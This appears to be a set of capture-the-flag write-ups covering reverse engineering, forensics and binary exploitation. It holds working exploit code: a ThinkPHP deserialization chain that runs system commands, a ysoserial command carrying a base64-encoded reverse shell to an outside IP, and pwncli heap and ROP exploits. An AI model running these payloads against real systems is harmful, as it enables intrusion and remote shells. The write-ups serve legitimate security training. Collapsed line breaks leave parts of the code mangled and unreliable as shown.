data = bytes.fromhex('6f4e5f5930555f46897ba4c3c5e378b3c39287b09294a4d3475245414037745430564e645f742365c39287b09294a4d384cc47499565958e66639b8caa5ee9335f3333595f53305f84cc47499565958ebe88f1eb10ce3e82714e5f5930555f464752454140377454be88f1eb10ce3e82d3adb3b06396d3ba33564e645f74236565639b8caa5ee933d3adb3b06396d3ba6dd0506cb4a2449f633333595f53305f6f4e5f5930555f466dd0506cb4a2449fb85889b8c5c285ad4c5245414037745430564e645f742365b85889b8c5c285adabb199987378e8c86b639b8caa5ee9335f3333595f53305fabb199987378e8c8a2dd9d94ff8c0a6e764e5f5930555f464752454140377454a2dd9d94ff8c0a6ec873b5b896c4b49438564e645f74236565639b8caa5ee933c873b5b896c4b49494b5a2bb92b597d9683333595f53305f6f4e5f5930555f4694b5a2bb92b597d99cad3561b4815199515245414037745430564e645f7423659cad3561b4815199a0779ba0a6a6c9a270639b8caa5ee9335f3333595f53305fa0779ba0a6a6c9a2c9c2efe3dd9f5da87b4e5f5930555f464752454140377454c9c2efe3dd9f5da8acc86161858380803d564e645f74236565639b8caa5ee933acc8616185838080897ba4c3c5e378b36d3333595f53305f6f4e5f5930555f46897ba4c3c5e378b3c39287b09294a4d3565245414037745430564e645f742365c39287b09294a4d384cc47499565958e75639b8caa5ee9335f3333595f53305f84cc47499565958ebe88f1eb10ce3e82804e5f5930555f46')data = struct.unpack('<72Q', data)
# print(data)done = Falseidx = 0flag = struct.unpack('<4Q', b'flag{IM_DUMMY_FLAG_1234567890AB}')
# flag = struct.unpack('<4Q', b'00000000111111112222222233333333')v52 = [flag[0], flag[1]]v53 = [flag[2], flag[3]]for idx in range(72): v63 = idx & 7 if idx % 4 == 0: ror_pair = ror_number[2*v63:2*v63+2] v55 = data[4 * (idx >> 2):4 * (idx >> 2)+4] v56 = [c_uint64(v55[2]+v53[0]).value, c_uint64(v55[3]+v53[1]).value] v57 = c_uint64(v55[1]+v52[1]).value data_x11 = c_uint64(v55[0]+v52[0]+v57).value data_x12 = ror8(v57, -ror_pair[0]) ^ data_x11 v52[0] = data_x11 v60 = ror8(v56[1], -ror_pair[1]) v53[1] = data_x12 data_x13 = c_uint64(v56[0]+v56[1]).value data_x14 = v60 ^ data_x13 v52[1] = data_x14 v53[0] = data_x13 continue ror_pair = ror_number[2*v63:2*v63+2] data_x11 = c_uint64(v52[1]+v52[0]).value v52[0] = data_x11 data_x12 = ror8(v52[1], -ror_pair[0]) ^ data_x11 v53[0] = c_uint64(v53[0]+v53[1]).value v65 = ror8(v53[1], -ror_pair[1]) data_x13 = v53[0] v53[1] = data_x12 data_x14 = v65 ^ v53[0] v52[1] = data_x14print(hex(v52[0]), hex(v52[1]))print(hex(v53[0]), hex(v53[1]))
# 密文v52[0]=0x13c17ce8fc8b8157v52[1]=0x645d9ac2d095d15bv53[0]=0x6096448f5a2d874cv53[1]=0x477d6619faa7d1c7
for idx in range(71, -1, -1): v63 = idx & 7 if idx % 4 == 0: ror_pair = ror_number[2*v63:2*v63+2] v55 = data[4 * (idx >> 2):4 * (idx >> 2)+4] data_x13 = v53[0] data_x14 = v52[1] v60 = data_x14 ^ data_x13 data_x12 = v53[1] v56[1] = rol8(v60, -ror_pair[1]) data_x11 = v52[0] v56[0] = c_uint64(data_x13-v56[1]).value data_x12 ^= data_x11 v57 = rol8(data_x12, -ror_pair[0]) v52[1] = c_uint64(v57-v55[1]).value v52[0] = c_uint64(data_x11-v55[0]-v57).value v53[0] = c_uint64(v56[0]-v55[2]).value v53[1] = c_uint64(v56[1]-v55[3]).value continue ror_pair = ror_number[2*v63:2*v63+2] data_x14 = v52[1] v65 = data_x14 ^ v53[0] data_x12 = v53[1] v53[1] = rol8(v65, -ror_pair[1]) v53[0] = c_uint64(v53[0]-v53[1]).value data_x12 ^= v52[0] v52[1] = rol8(data_x12, -ror_pair[0]) v52[0] = c_uint64(v52[0]-v52[1]).valuefrom Crypto.Util.number import long_to_bytesprint(long_to_bytes(v52[0])[::-1])print(long_to_bytes(v52[1])[::-1])print(long_to_bytes(v53[0])[::-1])print(long_to_bytes(v53[1])[::-1])
# flag{7hIs_I$_nEw_Try1N9_@cu7U@1}
void __cdecl sub_804AB46(int a1){ // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]
 v6 = __readgsdword(0x14u); write(1, &unk_805FBF4, 3u); buf[0] = 0; v5 = 0; memset((char *)buf + 1, 0, 4 * ((((char *)buf - ((char *)buf + 1) + 33) & 0xFFFFFFFC) >> 2)); v1 = read(0, buf, 0x20u); if ( *((_BYTE *)buf + v1 - 1) == 10 ) *((_BYTE *)buf + --v1) = 0; if ( v1 != 22 ) exit(0); if ( memcmp(buf, "flag{", 5u) || v4 != '}' ) exit(0); for ( i = 0; i <= 15; ++i ) *(_BYTE *)(*(_DWORD *)(a1 + 8) + i) = *((_BYTE *)&buf[1] + i + 1);}
case 0xD8: if ( ptr[v70] == ptr[v69] )// .text:
0804AA26 cmp edx, eax
明文 密文首字节flag{0000000000000000} 67flag{0000000000000001} 67flag{0000000000000011} 67flag{0000000001111111} 67flag{0000000011111111} 67flag{0000000111111111} DDflag{0000001111111111} 57flag{0000011111111111} 6Bflag{0000111111111111} 6Bflag{0001111111111111} FEflag{0011111111111111} 04flag{0111111111111111} FAflag{1111111111111111} 1C
# case 0x3B:# ptr[v38] = (int)ptr[v39] >> v40;# // .text:
0804937E sar ebx, cl
from ctypes import c_int32ebx = ida_dbg.get_reg_val('ebx')cl = ida_dbg.get_reg_val('cl')v = (c_int32(ebx).value>>cl)&0xFFFFFFFFprint(f'{ebx:
08X} >> {cl} = {v:
08X}')return 0
# case 0xA5:# ptr[v38] = ptr[v39] << v40;# // .text:
080493C9 shl ebx, clebx = ida_dbg.get_reg_val('ebx')cl = ida_dbg.get_reg_val('cl')v = (ebx<<cl)&0xFFFFFFFFprint(f'{ebx:
08X} << {cl} = {v:
08X}')return 0
# case 0xD8:# if ( ptr[v70] == ptr[v69] )
# // .text:
0804AA26 cmp edx, eaxdx = ida_dbg.get_reg_val('edx')ax = ida_dbg.get_reg_val('eax')print(f'{dx:
02X} == {ax:
02X}')return 0
# case 0xDC:# ptr[v31] = ptr[v32] + ptr[v33];# //.text:
08048FC9 add edx, ecxedx = ida_dbg.get_reg_val('edx')ecx = ida_dbg.get_reg_val('ecx')v = (edx+ecx)&0xFFFFFFFFprint(f'{edx:
08X} + {ecx:
08X} = {v:
08X}')return 0
// flag{0000000011111111}
00000010 >> 2 = 000000040000001F << 8 = 00001F0000000061 << 16 = 006100000000002B << 24 = 2B000000000000CC << 8 = 0000CC00000000FE << 16 = 00FE000000000099 << 24 = 99000000000000DD << 8 = 0000DD0000000071 << 16 = 0071000000000073 << 24 = 73000000000000BB << 8 = 0000BB00000000E1 << 16 = 00E100000000004B << 24 = 4B000000
// xor F3 2F 51 1B 04 FC CE A9 1B EC 40 42 EA 8A D0 7A// v0 = 0x2B611FC3// v1 = 0x99FECC34// v0+=((v1<<4)+k0)^(v1+sum)^((v1>>5)+k1);// v1+=((v0<<4)+k2)^(v0+sum)^((v0>>5)+k3);
57429F48 + 00000000 = 57429F48 ; sum+=delta99FECC34 << 4 = 9FECC340 ; v1 << 423575896 + 9FECC340 = C3441BD6 ; k0+(v1<<4)57429F48 + 99FECC34 = F1416B7C ; sum+v199FECC34 >> 5 = FCCFF661 ; v1>>589654528 + FCCFF661 = 86353B89 ; k1+(v1>>5)
B4304B23 + 2B611FC3 = DF916AE6 ; v0 += ((v1<<4)+k0)^(v1+sum)^((v1>>5)+k1);DF916AE6 << 4 = F916AE60 ; v0<<457429F48 + DF916AE6 = 36D40A2E ; sum+v0 ####DF916AE6 >> 5 = FEFC8B57 ; v0>>5793CDA2B + 99FECC34 = 133BA65F ; v1 += ((v0<<4)+k2)^(v0+sum)^((v0>>5)+k3);......
F3 2F 51 1B 04 FC CE A9 1B EC 40 42 EA 8A D0 7A
0xF3, 0x2F, 0x51, 0x1B, 0x04, 0xFC, 0xCE, 0xA9, 0x1B, 0xEC, 0x40, 0x42, 0xEA, 0x8A, 0xD0, 0x7A
delta: 57429F48rounds: 32k0: 0x23575896k1: 0x89654528
pwndbg> search -t bytes -w -x "96585723"Searching for value: b'x96XW#'[anon_f7cfb] 0xf7d06dcd 0x23575896
pwndbg> dd 0xf7d06dcd-8f7d06dc5 ff0e00cc 094200f7 23575896 00070925f7d06dd5 094210f7 89654528 00070925 094220f7f7d06de5 12582548 00070925 094230f7 45897856
key 23575896 89654528 12582548 45897856
b *0x804aa26
# eax存放的是正确密文，重复该操作16次set $edx=$eaxc
# enc_flag: 9C 6C 48 16 70 12 5a 2d e1 d7 f5 7c c5 46 32 68
    #include <stdint.h>#include <stdio.h>
unsigned char enc_flag[16] = { 0x9C, 0x6C, 0x48, 0x16, 0x70, 0x12, 0x5A, 0x2D, 0xE1, 0xD7, 0xF5, 0x7C, 0xC5, 0x46, 0x32, 0x68};
unsigned char xor_k[16] = { 0xF3, 0x2F, 0x51, 0x1B, 0x04, 0xFC, 0xCE, 0xA9, 0x1B, 0xEC, 0x40, 0x42, 0xEA, 0x8A, 0xD0, 0x7A};
int32_t k0 = 0x23575896;int32_t k1 = 0x89654528;int32_t k2 = 0x12582548;int32_t k3 = 0x45897856;int32_t delta = 0x57429F48;
void enc(int32_t *v){ int32_t _sum = 0; int32_t v0 = v[0]; int32_t v1 = v[1]; for (int i = 0; i < 32; i++) { _sum += delta; v0 += ((v1 << 4) + k0) ^ (v1 + _sum) ^ ((v1 >> 5) + k1); v1 += ((v0 << 4) + k2) ^ (v0 + _sum) ^ ((v0 >> 5) + k3); } v[0] = v0; v[1] = v1;}
void dec(int32_t *v){ int32_t _sum = delta * 32; int32_t v0 = v[0]; int32_t v1 = v[1]; for (int i = 0; i < 32; i++) { v1 -= ((v0 << 4) + k2) ^ (v0 + _sum) ^ ((v0 >> 5) + k3); v0 -= ((v1 << 4) + k0) ^ (v1 + _sum) ^ ((v1 >> 5) + k1); _sum -= delta; } v[0] = v0; v[1] = v1;}
int main(){ uint8_t pp[0x10 + 1] = "0000000011111111"; for (int i = 0; i < 8; i++) { pp[i] ^= xor_k[i]; //printf("%02X ", pp[i]); } //puts("");
 int32_t v[2] = {0x123,0x456}; v[0] = *(int32_t *)&pp[0]; v[1] = *(int32_t *)&pp[4]; enc(v); //printf("enc %08X %08Xn", v[0], v[1]); dec(v); //printf("dec %08X %08Xn", v[0], v[1]);
 v[0] = __builtin_bswap32(*(int32_t *)&enc_flag[0]); v[1] = __builtin_bswap32(*(int32_t *)&enc_flag[4]); dec(v); //printf("%08X %08Xn", v[0], v[1]); uint8_t *p = (uint8_t *)v; for (int i = 0; i < 8; i++) { p[i] ^= xor_k[i]; } v[0] = __builtin_bswap32(v[0]); v[1] = __builtin_bswap32(v[1]); printf("flag{"); for (int i = 0; i < 8; i++) { printf("%c", p[i]); } v[0] = __builtin_bswap32(*(int32_t *)&enc_flag[8]); v[1] = __builtin_bswap32(*(int32_t *)&enc_flag[12]); dec(v); //printf("%08X %08Xn", v[0], v[1]); p = (uint8_t *)v; for (int i = 0; i < 8; i++) { p[i] ^= xor_k[i + 8]; } v[0] = __builtin_bswap32(v[0]); v[1] = __builtin_bswap32(v[1]); for (int i = 0; i < 8; i++) { printf("%c", p[i]); } printf("}"); puts("");}
flag{1fu13_n19ela06~!}
    #include <string.h>#include <stdio.h>#include <stdlib.h>#include <stdint.h>#include <dlfcn.h>#include <time.h>
typedef int (*PFN_clock_gettime)(clockid_t clock_id, struct timespec *tp);
int clock_gettime(clockid_t clock_id, struct timespec *tp){ void *handle = dlopen("libc.so.6", RTLD_LAZY); PFN_clock_gettime real = (PFN_clock_gettime)dlsym(handle, "clock_gettime"); int res = real(clock_id, tp); int ts = atoi(getenv("TS_VALUE")); tp->tv_sec = ts; // printf("clock_gettime: %ldn", tp->tv_sec); return res;}
// gcc hook.c -shared -o hook.so
do { v53 = plaintext[v51]; ... *(_BYTE *)(*(_QWORD *)dest + v50) = v53 >> 4; ... ... *(_BYTE *)(*(_QWORD *)dest + v54) = v53 & 0xF; ... } while ( v49 != v51 );
0x35 -> 0x03 0x05
import os
enc_flag = open('./cipher_', 'rb').read()ts_start = 1702565186 # 密文文件的时间戳correct_ts = 0for off in range(0, -10, -1): ts = ts_start + off for ch in range(0x20, 0x80, 0x10): open('./1.bin', 'wb').write(bytes([ch])) # time.sleep(0.5) os.system(f'TS_VALUE={ts} LD_PRELOAD=./hook.so ./fancy --input=1.bin') # time.sleep(0.5) cipher = open('./cipher', 'rb').read() if cipher[0] == enc_flag[0]: print('correct_ts: ', ts, hex(cipher[0]), hex(ch)) correct_ts = ts break
# correct_ts: 1702565185 0x3d 0x40if not correct_ts: print('???') exit(0)
flag = b''size = len(enc_flag) // 2for idx in range(size-0x30, size): # 跳过前言 # 先爆破高位 for high in range(0x20, 0x80, 0x10): open('./1.bin', 'wb').write(b'A'*idx+bytes([high])) os.system(f'TS_VALUE={correct_ts} LD_PRELOAD=./hook.so ./fancy --input=1.bin') cipher = open('./cipher', 'rb').read() if cipher[idx*2] == enc_flag[idx*2]: # print(f'high: {high:
02X}') break # 再爆破低位 for low in range(0x10): open('./1.bin', 'wb').write(b'A'*idx+bytes([low])) os.system(f'TS_VALUE={correct_ts} LD_PRELOAD=./hook.so ./fancy --input=1.bin') cipher = open('./cipher', 'rb').read() if cipher[idx*2+1] == enc_flag[idx*2+1]: # print(f'low: {low:
02X}') break flag += bytes([high|low]) print('r'+flag.decode())
flag{Y0u_h@v3_5h@r9_e7e3!C0ngr@tul@t1on5}
import phoenixAESinp = "abcdefghijklmn12"dump = """809D8B75D9097398E20AFE0E6DA11E55399D8B75D909733EE20AFF0E6D401E55399D8B75D909733EE20AFF0E6D401E55809D6F75D9CA7398430AFE0E6DA11E5080CF8B75D5097398E20AFED06DA1785580CD8B7527097398E20AFE026DA1DA55A79D8B75D9097373E20A4A0E6DFC1E55809D8BE3D9092198E210FE0E93A11E55809D3B75D98F7398CF0AFE0E6DA11E00809D8875D93F7398BB0AFE0E6DA11E1780C58B7504097398E20AFE866DA1BD55EF9D8B75D9097328E20A9A0E6D891E55809D8B35D9091598E218FE0EF5A11E55809D8B10D909A198E2E4FE0E2DA11E55809D0675D94373980F0AFE0E6DA11EE680EF8B755F097398E20AFE2D6DA159554B9D8B75D90973D9E20A150E6DCA1E55"""with open(".\dump", "wb") as f: f.write(dump.encode())phoenixAES.crack_file('.\dump', verbose=0)
# Last round key #N found:# EA9F6BE2DF5C358495648BEAB9FCFF81
./aes_keyschedule EA9F6BE2DF5C358495648BEAB9FCFF81 10K00: 51574232303233486170707947616D65K01: BF6B0F928F593CDAEE294CA3A94821C6K02: EF96BB4160CF879B8EE6CB3827AEEAFEK03: 0F11008D6FDE8716E1384C2EC696A6D0K04: 97357039F8EBF72F19D3BB01DF451DD1K05: E9914EA7117AB98808A90289D7EC1F58K06: 075124A9162B9D211E829FA8C96E80F0K07: D89CA874CEB73555D035AAFD195B2A0DK08: 61797FA0AFCE4AF57FFBE00866A0CA05K09: 9A0D149335C35E664A38BE6E2C98746BK10: EA9F6BE2DF5C358495648BEAB9FCFF81
from Crypto.Cipher import ARC4key = b"WelcomeToQWB2023"with open(".\License.dat", "rb") as f: data = f.read()rc4 = ARC4.new(key)data = rc4.decrypt(data)with open(".\License_dec.dat", "wb") as f: f.write(data)
import structv28 = bytes.fromhex('45B6AB21796BFE965C1D04B28AA6B86A35F12ABF17D3036B')key = struct.unpack('<4I', b'WelcomeToQWB2023')_delta = 3735928559flag = b''for i in range(0, len(v28), 8): _sum = (32*_delta) & 0xFFFFFFFF v0, v1 = struct.unpack_from('<2I', v28, i) for k in range(32): v1 -= ((v0 << 4) + key[2] ^ v0 + _sum ^ (v0 >> 5) + key[3]) v1 &= 0xFFFFFFFF v0 -= ((v1 << 4) + key[0] ^ v1 + _sum ^ (v1 >> 5) + key[1]) v0 &= 0xFFFFFFFF _sum -= _delta _sum &= 0xFFFFFFFF flag += struct.pack('<2I', v0, v1)print(flag)
# dotN3t_Is_1nt3r3sting
from hashlib import md5h = md5(open(".\License_dec.dat", "rb").read()).digest()v10 = bytearray.fromhex( '3B416C6EDF5AF5E2067ADBAA93B016BE3C183A569661BCA67168E8C5EAE116B7284E6674')for i in range(len(v10)): v10[i] ^= h[i % len(h)]print(v10)
# flag{d0tN3t_I5_Ea57_2_y09!G00d_Luck}
<?phpnamespace thinkprocesspipes{ use thinkmodelPivot; ini_set('display_errors',1); class Windows{ private $files = []; public function __construct($function,$parameter){ $this->files = [new Pivot($function,$parameter)]; } } $aaa = new Windows('system','nl /f*'); echo base64_encode(serialize(array($aaa)));}namespace think{ abstract class Model {}}namespace thinkmodel{ use thinkModel; use thinkconsoleOutput; class Pivot extends Model{ protected $append = []; protected $error; public $parent; public function __construct($function,$parameter){ $this->append['jelly'] = 'getError'; $this->error = new relationBelongsTo($function,$parameter); $this->parent = new Output($function,$parameter); } } abstract class Relation{}}namespace thinkmodelrelation{ use thinkdbQuery; use thinkmodelRelation; abstract class OneToOne extends Relation{} class BelongsTo extends OneToOne{ protected $selfRelation; protected $query; protected $bindAttr = []; public function __construct($function,$parameter){ $this->selfRelation = false; $this->query = new Query($function,$parameter); $this->bindAttr = ['']; } }}namespace thinkdb{ use thinkconsoleOutput; class Query{ protected $model; public function __construct($function,$parameter){ $this->model = new Output($function,$parameter); } }}namespace thinkconsole{ use thinksessiondriverMemcache; class Output{ protected $styles = []; private $handle; public function __construct($function,$parameter){ $this->styles = ['getAttr']; $this->handle = new Memcache($function,$parameter); } }}namespace thinksessiondriver{ use thinkcachedriverMemcached; class Memcache{ protected $handler = null; protected $config = [ 'expire' => '', 'session_name' => '', ]; public function __construct($function,$parameter){ $this->handler = new Memcached($function,$parameter); } }}namespace thinkcachedriver{ use thinkRequest; class Memcached{ protected $handler; protected $options = []; protected $tag; public function __construct($function,$parameter){ // pop链中需要prefix存在，否则报错 $this->options = ['prefix' => 'jelly/']; $this->tag = true; $this->handler = new Request($function,$parameter); } }}namespace think{ class Request { protected $get = []; protected $filter; public function __construct($function,$parameter){ $this->filter = $function; $this->get = ["jelly"=>$parameter]; } }}//YToxOntpOjA7TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJqZWxseSI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6Mzp7czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NToiamVsbHkiO3M6NjoibmwgL2YqIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czoxMDoiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo2OiJqZWxseS8iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YToyOntzOjY6ImV4cGlyZSI7czowOiIiO3M6MTI6InNlc3Npb25fbmFtZSI7czowOiIiO319fX1zOjExOiIAKgBiaW5kQXR0ciI7YToxOntpOjA7czowOiIiO319czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NToiamVsbHkiO3M6NjoibmwgL2YqIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czoxMDoiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo2OiJqZWxseS8iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YToyOntzOjY6ImV4cGlyZSI7czowOiIiO3M6MTI6InNlc3Npb25fbmFtZSI7czowOiIiO319fX19fX0
flag{c7c7e293-d532-496b-b414-c28bb3fe9aa7}
grpcui -plaintext ip:
port
java -jar ysoserial-main-923a2bda4e-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny43Ni4xNzguODkvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}" | base64
#!/usr/bin/env python3
from pwncli import *cli_script()
io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
def cmd(i):    sla(">> ", i)
def add(sz, data="deadbeef"):    cmd('1')    sla("Size: ", str(sz))    sa("Note: ", data)
def show(idx):    cmd('2')    sla("Index: ", str(idx))
def delete(idx):    cmd('3')    sla("Index: ", str(idx))
add(0x410) # 0add(0xe0) # 1add(0x430) # 2add(0x430) # 3add(0x100) # 4add(0x480) # 5add(0x420) # 6add(0x10)
delete(0)delete(3)delete(6)
delete(2)
add(0x450, flat({0x438: p16(0x551)})) # 0
add(0x410) # 2add(0x420) # 3add(0x410) # 6
delete(6) delete(2) add(0x410) # 2add(0x410) # 6
delete(6) delete(3)delete(5)
add(0x4f0, b"a"*0x488 + p64(0x431)) # 3
add(0x3b0) # 5
# add(0x410) # 6
delete(4)
add(0x108, b"a"*0x100 + p64(0x550))
add(0x410)
delete(3)
add(0x10)
show(6)libcaddr = recv_current_libc_addr()leak("libcaddr", libcaddr)
lbs = set_current_libc_base_and_log(libcaddr, 0x219ce0)
add(0x3f0)add(0x60, flat({0x18: 0x91}))add(0x3f0)
delete(6)
show(8)heapaddr = (u64_ex(rl()[-6:-1]) << 12) + 0xc30leak("heap addr", heapaddr)
delete(4)delete(10)
stdoutaddr = libc.sym._IO_2_1_stdout_
add(0x80, flat({0x48: 0x401, 0x50: p64(((heapaddr + 0x470) >> 12) ^ (stdoutaddr-0x10))[:-1]}))
CurrentGadgets.set_find_area(find_in_elf=False, find_in_libc=True, do_initial=False)
pay = IO_FILE_plus_struct().house_of_apple2_stack_pivoting_when_do_IO_operation(stdoutaddr, libc.sym._IO_wfile_jumps-0x20, CG.leave_ret(), CG.pop_rbp_ret(), heapaddr+0x470-0x8)
add(0x3f0, CG.orw_chain(heapaddr+0x538, heapaddr, buf_len=0x100) + b"/flagx00")
add(0x3f0, flat_z({0x10:
pay}))
ia()
from pwncli import *
gift.elf = ELF("./A-rtsp")
context.log_level = 'debug'context.arch="amd64"context.os='linux'
# 设置RTSP服务器的地址和端口servers = "8.147.129.5"port = 15947
# 连接服务器conn = remote(servers, port)gift.io = conn
seq = 1track_url = "rtsp://{0}:{1}/*".format(servers, port)
request = f"GET_PARAMETER {track_url} RTSP/1.0rnCSeq: {seq}rnGET_INFO: 2023rnrn"seq += 1conn.send(request)
ru(" need this ")addr = int16_ex(rl())codebase = addr - 0x2A9990set_current_code_base_and_log(codebase)CG.set_find_area()
request = f"SET_PARAMETER {track_url} RTSP/1.0rnCSeq: {seq}rDESCRIBE_FLAG: qwbrnrn"seq += 1conn.send(request)
#  0x000000000002e098: mov qword ptr [rax + 0x10], rdx; nop; pop rbp; ret;track_url = "rtsp://{0}:{1}/wavAudioTest".format(servers, port)ssss = b"a"*(0x1a0-8-0xc) + b"xa0" + b"a"*7 +  flat([    CG.pop_rax_ret(),    addr-0x10,    CG.pop_rdx_ret(),    u64_ex("/flag"),    0x000000000002e098 + codebase, 0,    CG.orw_chain(addr, addr+0x10, 6, 5, 0x60)])
ssss= ssss.decode('latin-1')request = f"DESCRIBE {track_url} RTSP/1.0rnCSeq: {seq}rnvul_string: {ssss}rnrn"seq += 1conn.send(request)
# 关闭连接conn.interactive()
#!/usr/bin/env python3'''Author:
7resp4ssDate:
2023-12-16 19:02:
51Usage: Debug : python3 exp.py debug elf-file-path -t -b malloc Remote: python3 exp.py remote elf-file-path ip:
port'''
from pwncli import *cli_script()

io: tube = gift.ioelf: ELF = gift.elflibc=ELF('./libc-2.27.so')
filename = gift.filename # current filenameis_debug = gift.debug # is debug or not is_remote = gift.remote # is remote or notgdb_pid = gift.gdb_pid # gdb pid if debug

def add(name): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'add') sla('Enter new username: ', (name)) sleep(0.1) #......
def switch(name): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'switch') sla('nter username to switch to: ', (name)) sleep(0.1) #......
def listuser(): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'listuser') sleep(0.1) #......
def read(): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'read') sleep(0.1)
def dele(name): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'delete') sla('Enter username to delete: ', (name)) sleep(0.1) #......
def message(name,sz,cont): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'message') sla('To: ', (name)) sla('Message size:', str(sz)) sla('Content: ', cont) sleep(0.1)
sla('Enter new username: ','fxxker')
def leak_libc(): add(b'aaaaaaaaaaaaaaaaa') dele(b'aaaaaaaaaaaaaaaaa') message(b'fxxker',2311,b'a') message(b'fxxker',1716,b'a') dele(b'fxxker') message(b'fxxker',96,b'a'*96) read() leak_lb = recv_current_libc_addr(0,0x100) leak_ex2(leak_lb) return leak_lb
lb = leak_libc() - 0x3ec3a0libc.address = lbleak_ex2(lb)
message(b'fxxker',1624,b'a')switch(b'fxxker')dele(b'fxxker')dele(b'fxxker')listuser()read()'''b' fxxker -> fxxker: xa0x03xe7xd5x96x7fn''''switch(b'fxxker')dele(b'fxxker')switch(b'fxxker')switch(b'fxxker')message(b'fxxker',3894,b'a')switch(b'fxxker')switch(b'fxxker')dele(b'fxxker')add(b'aaaaaaaa')add(b'aaaa')message(b'fxxker',2252,b'a')message(b'fxxker',1737,flat({ 0x10:'x00/bin/sh;x00', 1232-0x10:[ 0,0x61 ], 1737:''}))read()'''b' Donen''''dele(b'aaaaaaaa')listuser()add(b'aaaaaaa')
message(b'fxxker',1875,'a')message(b'fxxker',1760-8,flat( { 0:'/bin/shx00', 1232:
libc.sym.__free_hook - 0x8 }))
message(b'fxxker',0x60-8,flat( { 0:'/bin/shx00', 0x60-8:'' }))message(b'fxxker',0x60-8,flat( { 0:['/bin/shx00', libc.sym.system] }))add('fxxker')read()
ia()
from pwncli import *cli_script()set_remote_libc('libc-2.27.so')
io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)
payload = '''int c;
int main(){ int b; int libc; int* free_hook; char* sh; libc = 0 ; free_hook = libc + 1; free_hook = malloc(0x500); sh = malloc(0x10); free(free_hook); libc = *free_hook - 0x3ebca0; printf("%lx",libc); free_hook = libc + 0x3ed8e8; *free_hook = libc + 0x4F420; sh[0] = 's'; sh[1] = 'h'; free(sh); return 0;}'''sla('size:',str(len(payload)))sla('et:',payload)ia()
flag{bbdee5c548fddfc76617c562952a3a3b03d423985c095521a8661d248fad3797}
strings main.mem | grep "Linux version"
python2 vol.py -f C:
Users22826Desktopmain.mem --profile=LinuxUbuntu2004x64 linux_find_file -L | findstr "Desktop"
python2 vol.py -f C:
Users22826Desktopmain.mem --profile=LinuxUbuntu2004x64 linux_find_file -i 0xffff9ce28fe300e8 -Ohave_your_fun.jocker
flag{It's_So_Hard_To_Find_A_Picture}
#!/usr/bin/env python3
from pwncli import *
cli_script()
io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libccontext.arch = "amd64"

def add(des, next): io.recvuntil(b"4. Quit.") io.sendline(b"1") io.recvuntil(b"Input destination IP:") io.sendline(des) io.recvuntil(b"Input the next hop:") io.sendline(next)

def show(des): io.recvuntil(b"4. Quit.") io.sendline(b"2") io.recvuntil(b"Input destination IP:") io.sendline(des)

def get_flag(): io.recvuntil(b"4. Quit.") io.sendline(b"3")

def leak(data): add(str(data).encode() + b".0.0.0", b"0.0.0.0") get_flag() show(str(data).encode() + b".0.0.0") io.recvuntil(b"The next hop is ") info = io.recvuntil(b"n", drop=True) parts = info.split(b".") parts = parts[::-1] ascii_values = [chr(int(part)) for part in parts] ascii_values = "".join(ascii_values) flag = ascii_values return flag

